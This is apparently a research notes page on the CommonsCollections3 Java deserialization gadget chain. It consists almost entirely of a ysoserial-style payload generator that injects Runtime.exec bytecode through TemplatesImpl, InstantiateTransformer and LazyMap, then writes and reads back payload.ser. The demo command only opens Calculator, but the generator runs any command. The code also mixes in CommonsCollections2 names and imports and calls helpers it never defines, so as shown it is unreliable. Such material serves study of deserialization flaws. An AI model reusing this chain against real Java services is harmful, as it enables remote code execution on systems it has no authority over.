---
description: InstantiateTransformer+LazyMap
---

# CommonsCollections3

PayLoad：

```java
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import static sun.reflect.misc.FieldUtil.getField;
public class CommonCollection2Payload {
//    通过javassist动态创建类的时候需要用到这个类
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
// 设置成员变量值
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        try {
            //获取私有成员变量
            field = obj.getClass().getDeclaredField(fieldName);
            //获取私有成员变量访问权限
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        field.set(obj, value);
    }
//  获取成员变量值得
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = null;
        try {
            field = obj.getClass().getDeclaredField(fieldName);
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        return field.get(obj);
    }
//  7u21反序列化漏洞恶意类生成函数
    public static Object createTemplatesImpl(String command) throws Exception{
        Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        final byte[] classBytes = clazz.toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes});
        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        return templates;
    }
    public static void main(String[] args) throws Exception {
        String command = "open /Applications/Calculator.app/";
        Object templatesImpl = createTemplatesImpl(command);
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templatesImpl } )};
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);
        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);
        //这样的话，调用transformerChain的tranform方法就相当于调用TrAXFilter(templatesImpl)
        setFieldValue(transformerChain, "iTransformers", transformers);
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handler);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
```



